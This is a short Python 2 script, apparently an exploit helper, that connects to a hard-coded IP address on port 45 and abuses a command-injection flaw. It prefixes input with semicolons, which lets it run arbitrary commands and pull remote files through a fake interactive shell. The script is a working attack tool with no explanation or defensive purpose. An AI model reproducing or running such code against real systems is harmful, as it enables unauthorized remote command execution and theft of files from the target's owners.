#!/usr/bin/env python

import socket
import sys
import os
import time

HOST = "142.93.118.186"
PORT = 45
helptext = '''shell Drop into an interactive shell and allow users to gracefully exit
pull <remote-path> <local-path> Download files
help Shows this help menu
quit Quit the shell'''

shell = False

while True:

    to_send = raw_input("$ ")

    if to_send == "quit":
        sys.exit(0)

    elif "pull" in to_send:
        cmd = to_send.split(" ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.recv(1024)
        file = s.send("; cat %s\n" % cmd[1])
        with open(cmd[2], "wb") as f:
            f.write(s.recv(9999999))

    elif "help" == to_send:
        print helptext

    elif "shell" == to_send:
        cwd = '/'
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.recv(1024)
            to_send = raw_input("[remote] %s $ " % cwd)
            to_send_final = to_send

            if to_send == "exit":
                break
                
            elif "cd " in to_send:
                cwd = to_send.split()[1]
                continue
                
            s.send("; cd %s ; %s\n" % (cwd, to_send_final))

            ret = s.recv(1024)
            while "Panel" in ret:
                s.send("; cd %s ; %s\n" % (cwd, to_send_final))
                ret = s.recv(1024)
            print ret
            s.close()
    else:
        print helptext
